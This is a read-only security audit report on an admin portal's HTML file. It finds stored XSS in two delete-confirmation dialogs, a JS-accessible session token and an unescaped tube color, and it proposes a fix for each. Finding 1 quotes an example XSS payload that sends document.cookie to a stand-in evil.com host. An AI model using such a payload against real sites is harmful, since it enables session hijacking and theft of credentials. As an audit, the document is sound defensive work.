# Wave 189 — Frontend Security Audit: public/splice.html
**Audit type:** READ-ONLY frontend security audit  
**Surface:** Splice matrix admin/staff portal (NOT the contractor field-token flow)  
**File:** `public/splice.html` — 9,763 lines, ~490 KB  
**Branch:** `agent/wave-189-splice-html-frontend-audit`  
**Date:** 2026-05-30

---

## Executive Summary

`public/splice.html` has a strong overall security posture: a correct DOM-based `esc()` function is used consistently throughout most rendering paths, `toast()` uses `textContent`, `showUndoSnackbar` uses `esc()`, SSE events trigger API re-fetches rather than direct DOM injection, comment threads are fully escaped, and Konva.js canvas rendering cannot host XSS.

**Two confirmed stored XSS vectors exist** in `deleteCable()` and `deleteLocation()` where `cable.name` and `loc.name` are interpolated raw into the `body` parameter of `confirmDialog()` — which renders `${body}` as raw `innerHTML`. Any staff member who can create a cable or location with a crafted name will trigger XSS execution when another engineer attempts to delete that object.

Additionally, `sessionStorage.lfs_token` is JS-accessible (MEDIUM), and one LOW-severity unescaped tube color value exists.

---

## Findings

### FINDING 1 — MEDIUM (Stored XSS): `deleteCable()` raw `cable.name` in confirmDialog body

**Verified by reading:** `public/splice.html:5368-5371`

```javascript
const _cableBody = dependentSplices
  ? `Cable "${cable.name}" has ${dependentSplices} splice record${...} on its fibers that will be cascade-deleted.`
  : `Cable "${cable.name}" will be permanently removed.`;
if (!await confirmDialog({ title: `Delete cable "${esc(cable.name)}"?`, body: _cableBody, ... })) return;
```

Root cause: `confirmDialog` at line 6087 renders `${body}` as raw innerHTML:
```javascript
<div class="body" style="font-size:13px;line-height:1.5;white-space:pre-wrap">${body}</div>
```

`cable.name` is properly escaped in the `title` parameter but NOT in the `body` template literal. A crafted cable name like `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` stored in the DB will execute when an engineer clicks Delete.

**Attack path:** Attacker (any staff with cable-creation rights) creates cable with crafted HTML name -> victim opens cable inspector -> victim clicks Delete -> confirm dialog renders payload as HTML -> arbitrary JS executes in victim's authenticated session.

**Fix:** Change lines 5368-5369 to:
```javascript
const _cableBody = dependentSplices
  ? `Cable "${esc(cable.name)}" has ${dependentSplices} splice record${...} that will be cascade-deleted.`
  : `Cable "${esc(cable.name)}" will be permanently removed.`;
```

---

### FINDING 2 — MEDIUM (Stored XSS): `deleteLocation()` raw `loc.name` in confirmDialog body

**Verified by reading:** `public/splice.html:5485-5488`

```javascript
const _locBodyParts = [`Location "${loc.name}" will be permanently deleted.`];
if (closureCount) _locBodyParts.push(`${closureCount} closure${...} will also be deleted ...`);
if (!await confirmDialog({ title: `Delete location "${esc(loc.name)}"?`, body: _locBodyParts.join('\n\n'), ...})) return;
```

Same pattern as Finding 1. `loc.name` is escaped in `title` but NOT in `_locBodyParts[0]`. The `join('\n\n')` result goes to `confirmDialog.body` which renders raw HTML.

**Fix:** Change line 5485:
```javascript
const _locBodyParts = [`Location "${esc(loc.name)}" will be permanently deleted.`];
```

---

### FINDING 3 — MEDIUM (Information Disclosure): `sessionStorage.lfs_token` JS-accessible JWT

**Verified by reading:** `public/splice.html:1067`

```javascript
try {
  const tok = sessionStorage.getItem('lfs_token');
  if (tok) opts.headers['Authorization'] = 'Bearer ' + tok;
} catch(e) {}
```

`sessionStorage` is accessible from JS in the same tab origin. If Findings 1/2 are exploited, the Bearer token is immediately exfiltrable — enabling full session takeover beyond the one-shot payload. Severity of the XSS findings is elevated by this factor.

`sessionStorage` clears on tab close (lower risk than localStorage), and the `lfs_session` httpOnly cookie is the correct long-term auth vehicle. The `lfs_token` path is a secondary fallback that should be eliminated.

**Fix:** Migrate to relying exclusively on the `lfs_session` httpOnly cookie. Remove the `sessionStorage.getItem('lfs_token')` path and any code writing `lfs_token` to sessionStorage.

---

### FINDING 4 — LOW (Unescaped value): Tube color in `tubeSel.innerHTML`

**Verified by reading:** `public/splice.html:5686`

```javascript
tubeSel.innerHTML = '<option value="">Pick tube…</option>' + tubes.map(t =>
  `<option value="${t.id}">${t.position}. ${t.color}</option>`
).join('');
```

`t.color` interpolated without `esc()`. Tube colors are TIA-598 color names from a server-controlled enum-like field; practical exploitation is negligible but inconsistent with the rest of the file.

**Fix:** `${esc(t.position)}. ${esc(t.color)}`

---

## Confirmed Safe Sections

**`esc()` (lines 1102-1107):** Correct DOM-based implementation using `div.textContent` / `div.innerHTML`. Handles all HTML metacharacters including quotes and angle brackets.

**`toast()` (lines 1093-1100):** Uses `el.textContent = msg` — cannot execute HTML.

**`showUndoSnackbar()` (lines 1025-1058):** Uses `esc(label)` at line 1032. The `cable.name`/`loc.name` snackbar callsites at lines 5212, 5376, 5493 are safe here (XSS only exists in the `confirmDialog` body path).

**SSE event handling (lines 1743-1811):** SSE payloads trigger `hydrateProject()` API re-fetch or compare closure IDs before fetching markups. No attacker-controlled SSE data rendered directly into DOM.

**Comment threads — `renderCommentThread()` (lines 4022-4054):** body, author name, reply body, timestamps all use `esc()`. Contractor-submitted comments rendered safely to staff.

**Matrix table view (lines 6880-6896):** All columns use `esc()`.

**Search results (lines 5930-5992):** All result labels use `esc()`.

**Cable inspector (lines 3210-3256):** `cable.name`, `.category`, `.construction_type`, `.manufacturer_part`, `.notes`, location names all use `esc()`.

**Location inspector (lines 3412-3502):** `loc.type`, `.name`, `.notes`, cable/closure/splitter fields all use `esc()`.

**Closure inspector (lines 3683-3798):** `cl.model`, `loc.name`, `cable.name` use `esc()`.

**Splice rows (lines 4609-4654):** cable names, circuit_name, customer via `esc()`.

**Field markup thumbnails (lines 3930-3946):** Server-assigned IDs for URLs; `splicer_name`, `notes` use `esc()`.

**Project list (lines 1235-1244):** `esc(p.name)` and `esc(p.status)`.

**Import rows (lines 8937-8961):** `source_filename`, `uploaded_by_name`, `status` all use `esc()`.

**`showModal` title:** `esc(title)` at line 6034 — all titles safe regardless of callsite.

**`showModal` body callsites with user data** (lines 5228, 5293, 5166 etc.): User-data values in these body templates all use `esc()` within the HTML string. Only the `confirmDialog` pattern (separate function) has the raw-body vulnerability.

**`confirmDialog` static-body callsites** (lines 3980, 4119, 4288, 4478, 4532, 5499, 5509, 5524, 6988, 6999, 9281, 9518, 9591): String literals or numeric-count-only templates — no user-controlled string content.

**`deleteClosure()` (line 5207):** `esc(_cl.model)` in title; body constructed from numeric counts only. SAFE.

**`_lossBadgeHtml()` (lines 4590-4607):** `esc(tip)` for title attribute.

**`window.open()` calls:** Server-assigned UUIDs only — no open redirect.

**`window.location.href` on 401 (line 1077):** `encodeURIComponent(window.location.pathname)` — no open redirect via user input.

**Konva.js canvas rendering:** Text rendered as canvas bitmap, not HTML/SVG. No XSS surface.

**Custom layer `default_style.color` (lines 7125-7129):** Originates from `<input type="color">` which constrains to `#rrggbb` hex. SAFE.

**Lock banner (line 1732):** `esc(heldBy)`.

---

## Coverage Gaps

1. **MapLibre GL popup rendering** — popup `.setHTML()` callsites with user data were not exhaustively checked. Any `.setHTML()` with unescaped user values would be a vector. Warrants a focused check on all `popup.setHTML` callsites.

2. **Import mapping UI body (line 9476)** — `mappingHtml(kind)` function was not read in full.

---

## Summary Table

| # | Severity | Category | Location | Finding |
|---|---|---|---|---|
| 1 | MEDIUM | Stored XSS | `splice.html:5368-5371` | `cable.name` unescaped in `confirmDialog` body |
| 2 | MEDIUM | Stored XSS | `splice.html:5485` | `loc.name` unescaped in `confirmDialog` body |
| 3 | MEDIUM | Token Storage | `splice.html:1067` | `lfs_token` in JS-accessible `sessionStorage` |
| 4 | LOW | Unescaped Output | `splice.html:5686` | `t.color` unescaped in tube selector `<option>` |

=== WAVE-189 SPLICE.HTML FRONTEND AUDIT REPORT END ===
